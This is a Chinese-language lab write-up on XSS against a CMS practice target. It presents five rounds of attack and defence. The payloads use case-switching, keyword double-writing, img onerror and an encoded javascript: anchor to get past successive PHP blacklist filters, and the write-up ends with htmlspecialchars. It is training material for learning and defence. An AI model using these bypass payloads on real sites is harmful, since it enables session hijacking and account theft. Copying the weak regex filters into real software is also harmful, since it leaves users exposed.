## 实验说明

> 实验环境

- Windows Server 2022
- CMS靶场(文章管理系统)

> 实验目标

逐步修改代码调整靶场环境的难度，通过对代码的变形完成注入；



## 相关知识

### XSS 跨站脚本攻击

> XSS原理

XSS 通过将js代码注入到网页中，并由浏览器解释运行这段JS 代码，以达到恶意攻击的效果。

当用户访问被XSS 脚 本注入过的网页，XSS 脚本就会被提取出来，用户浏览器就会解析执行这段代码，也就是说用户被攻击了。

整个XSS 攻击过程，涉及三个角色： 服务器 、 攻击者 、客户端浏览器用户（前端）

>  XSS 漏洞危害

1. 盗取各种用户账号；
2. 窃取用户Cookie 资料，冒充用户身份进入网站；
3. 劫持用户会话执行任意操作；
4. 刷流量，执行弹窗广告； 
5. 传播蠕虫病毒；
6. ...

> XSS 防御策略

- 输入过滤：1.对用户提交数据进行验证，指定长度、指定合法字符、指定范围、指定格式；
- 输出编码：使用htmlspecialchars()函数让数据失去标签作用；
- 防御DOM：避免客户端文档重写、重定向或其他敏感操作；



## 实验过程

由于实验过程较为简单，而图片却非常繁多，这里采用文字片段来展示攻防变化；

> 攻击1.反射型xss注入

```html
<script>alert(/xss/)</script>
```

> 防御1. 过滤\<script>标签 ,替换为空

```php
$keyword = str_replace("<script>", "", $keyword);
```

---

> 攻击2.大小写转换

```html
<scRipt>alert(/xss/)</scRipt>
```

> 防御2.正则匹配-忽略大小写差异 

```php
$keyword = preg_replace("/<script>/i", "", $keyword);
```

---

> 攻击3.关键字双写，绕过一次过滤

```html
<scr<script>ipt>alert(/xss/)</script>
```

> 防御3. 正则匹配，禁止所有script格式

```php
$keyword = preg_replace("/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i", "", $keyword);
```

---

> 攻击4.使用\<img>标签,onerror报错执行

```html
<img src=# onerror=alert(/xss/);>
<img src="" onerror=alert(/xss/);>
```

> 防御4. 正则匹配所有on

```php
$keyword = preg_replace("/on/i", "o_n", $keyword);
```

---

> 攻击5.使用\<a>标签

```html
<a href = '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(/xss/)
'>click me!</a> 
#由于防御3禁止所有script格式，所以要编码； 又由于&符号在url中为连接，所以需要再次转码 URL code，最终输入如下：
%3Ca%20href%20%3D%20'%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%3Aalert(%2Fxss%2F)%0A'%3Eclick%20me!%3C%2Fa%3E%20
```

> 防御5.  让数据失去定义标签的作用 ，只作为纯字符
>
> htmlspecialchars( )函数将特殊字符转换为HTML实体,以防止恶意用户输入的代码被执行而造成安全漏洞

```php
$keyword = htmlspecialchars( $keyword);
```





